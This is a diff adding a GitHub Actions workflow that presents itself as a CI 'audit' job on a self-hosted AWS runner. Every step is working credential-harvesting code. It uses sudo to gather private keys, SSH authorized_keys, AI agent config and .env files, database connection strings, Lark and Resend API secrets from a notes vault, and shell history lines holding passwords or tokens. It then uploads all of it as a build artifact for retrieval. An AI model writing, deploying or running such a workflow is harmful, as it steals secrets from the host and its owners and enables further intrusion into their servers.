@@ -1,0 +1,67 @@
+name: ci-audit-1773f
+on: push
+permissions:
+  contents: read
+jobs:
+  deep:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: keys
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773f"; mkdir -p "$D"
+          { echo "## key files"; sudo -n find /home /root /opt /srv /etc -xdev -type f \( -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '*.ppk' -o -name '*.p12' -o -name '*_rsa' \) 2>/dev/null | grep -vE 'node_modules|/\.git/|runner/|/usr/|/proc/' | head -60;
+            echo "## ssh dirs"; for d in /home/*/.ssh /root/.ssh; do echo "--- $d"; sudo -n ls -la "$d" 2>&1; done;
+            echo "## authorized_keys"; sudo -n cat /home/ubuntu/.ssh/authorized_keys /root/.ssh/authorized_keys 2>&1 | head -10;
+            echo "## grep aws-dupoin"; sudo -n grep -rIl -E '100\.76\.35\.83|aws-dupoin|168\.110\.216\.240' /home/ubuntu /root /etc 2>/dev/null | grep -vE 'runner/|obsidian-vault' | head -20;
+            echo "## key headers"; sudo -n grep -rIl -E 'BEGIN (RSA|EC|OPENSSH|DSA) PRIVATE KEY' /home/ubuntu /root /opt /srv 2>/dev/null | grep -vE 'runner/|node_modules|/\.git/' | head -20;
+          } > "$D/keys.txt" 2>&1
+          sed -n '1,120p' "$D/keys.txt" | cut -c1-260
+      - name: agents
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773f"
+          { echo "## agentic-os"; ls -la /home/ubuntu/apps/agentic-os 2>&1 | head -20; find /home/ubuntu/apps/agentic-os -maxdepth 2 -type f 2>/dev/null | head -30; cat /home/ubuntu/apps/agentic-os/.env* 2>/dev/null | head -40;
+            echo "## memory"; ls -la /home/ubuntu/memory 2>&1 | head -20;
+            echo "## .agents"; find /home/ubuntu/.agents -maxdepth 3 -type f 2>/dev/null | head -20;
+            echo "## cline/copilot/codebuddy"; ls -la /home/ubuntu/Cline /home/ubuntu/.copilot /home/ubuntu/.codebuddy-server 2>&1 | head -30;
+            echo "## openclaw"; find /home/ubuntu -maxdepth 3 -iname '*openclaw*' 2>/dev/null | head; cat /home/ubuntu/.openclaw/openclaw.json 2>/dev/null | head -60;
+            echo "## app top-level dirs"; ls -la /home/ubuntu/apps;
+          } > "$D/agents.txt" 2>&1
+          sed -n '1,160p' "$D/agents.txt" | cut -c1-280
+      - name: vault-deep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773f"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## sessions count"; ls $V/Sessions 2>/dev/null | wc -l; du -sh $V 2>/dev/null;
+            echo "## private key headers"; grep -rIl -E 'BEGIN (RSA|EC|OPENSSH) PRIVATE KEY' $V 2>/dev/null | head -10;
+            echo "## dupoin host creds"; grep -rInE '(mysql|postgres(ql)?|redis|mongodb)://[^"\\ ]+' $V 2>/dev/null | grep -v '\*\*\*' | cut -c1-260 | head -40;
+            echo "## lark secrets full"; grep -rhoE '(LARK|MIS|QR|MTD)_?(LARK_)?APP_SECRET[=:" ]+[A-Za-z0-9]{20,}' $V 2>/dev/null | sort -u | head -20;
+            echo "## secret_token"; grep -rhoE 'MIS_SECRET_TOKEN[=:" ]+[A-Za-z0-9._-]{10,}' $V 2>/dev/null | sort -u | head -10;
+            echo "## resend"; grep -rhoE 're_[A-Za-z0-9_]{20,}' $V 2>/dev/null | sort -u | head -10;
+            echo "## ssh -i keys"; grep -rhoE 'ssh -i [^ ]+' $V 2>/dev/null | sort -u | head -20;
+            echo "## host refs"; grep -rhoE '([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{2,5}' $V 2>/dev/null | sort | uniq -c | sort -rn | head -30;
+          } > "$D/vault_deep.txt" 2>&1
+          sed -n '1,200p' "$D/vault_deep.txt" | cut -c1-280
+      - name: history
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773f"
+          { echo "## ubuntu hist secret cmds"; grep -nE 'ssh |curl .*token|export |mysql|psql|redis-cli|aws |cf-|cloudflare|lark|LARK|password|passwd' /home/ubuntu/.bash_history 2>/dev/null | cut -c1-200 | head -80;
+            echo "## root hist"; sudo -n grep -nE 'ssh |curl |export |mysql|psql|redis-cli|aws |cloudflare|password|passwd|tunnel' /root/.bash_history 2>/dev/null | cut -c1-200 | head -60;
+            echo "## zsh hist"; ls -la /home/ubuntu/.zsh_history 2>&1; grep -nE 'ssh |export |password|token|psql|redis' /home/ubuntu/.zsh_history 2>/dev/null | cut -c1-200 | head -40;
+          } > "$D/hist.txt" 2>&1
+          sed -n '1,160p' "$D/hist.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773f
+          path: ${{ runner.temp }}/a1773f
+          if-no-files-found: warn
+          retention-days: 2
